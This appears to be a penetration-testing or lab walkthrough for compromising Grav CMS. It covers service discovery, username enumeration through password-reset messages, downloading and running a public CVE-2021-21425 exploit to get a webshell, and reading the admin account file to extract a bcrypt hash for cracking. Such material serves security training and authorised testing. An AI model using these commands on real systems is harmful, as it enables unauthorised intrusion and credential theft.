# Grav CMS

Grav CMS exposed with the Admin plugin can be identified from the `/grav-admin/` path. Older vulnerable installs can be abused with CVE-2021-21425 for unauthenticated command execution.

## Discovery

```bash
nmap -sC -sV TARGET
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
# 80/tcp open  http    Apache httpd 2.4.41
# http-title: Index of /
# http-ls: grav-admin/
```

Confirm the Grav path directly:

```bash
curl http://TARGET/grav-admin/
nuclei -u http://TARGET/grav-admin -as -rl 8 -c 6
# [metatag-cms] http://TARGET/grav-admin/ ["GravCMS"]
# [tech-detect:grav-cms] http://TARGET/grav-admin/
```

Useful paths from content discovery:

```text
/grav-admin/admin
/grav-admin/login
/grav-admin/home
/grav-admin/forgot_password
/grav-admin/user_profile
/grav-admin/typography
/grav-admin/admin/login
/grav-admin/admin/forgot
```

## Username Enumeration

The password reset flow can reveal a valid admin user by returning different responses.

```text
Invalid user:
Instructions to reset your password have been sent to your email address

Valid admin user:
Cannot reset password. This site is not configured to send emails
```

Reference: https://github.com/advisories/GHSA-q3qx-cp62-f6m7

## CVE-2021-21425 Unauthenticated RCE

Use the CVE-2021-21425 PoC against the Grav root path:

```bash
wget https://raw.githubusercontent.com/bluetoothStrawberry/cve-2021-21425/refs/heads/main/exploit.py
python3 exploit.py -u http://TARGET/grav-admin
```

Successful output drops into a webshell:

```text
Waiting 1 seconds for http://TARGET/grav-admin/tmp/RANDOM.php creation!
Initiating hacking session
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Post-Exploitation Enumeration

Grav stores user accounts in YAML files:

```bash
find . | grep .yaml
cat /var/www/html/grav-admin/user/accounts/admin.yaml
```

Useful fields from `admin.yaml`:

```yaml
state: enabled
email: admin@gravity.com
access:
  admin:
    login: true
    super: true
  site:
    login: true
fullname: admin
hashed_password: $2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.
reset: 'd6922bfba01d3c283a14beb3b396324e::1779660379'
```

The password hash is bcrypt:

```bash
hashcat --identify '$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.'
# 3200 | bcrypt $2*$, Blowfish (Unix)
```

## References

- https://github.com/bluetoothStrawberry/cve-2021-21425
- https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/
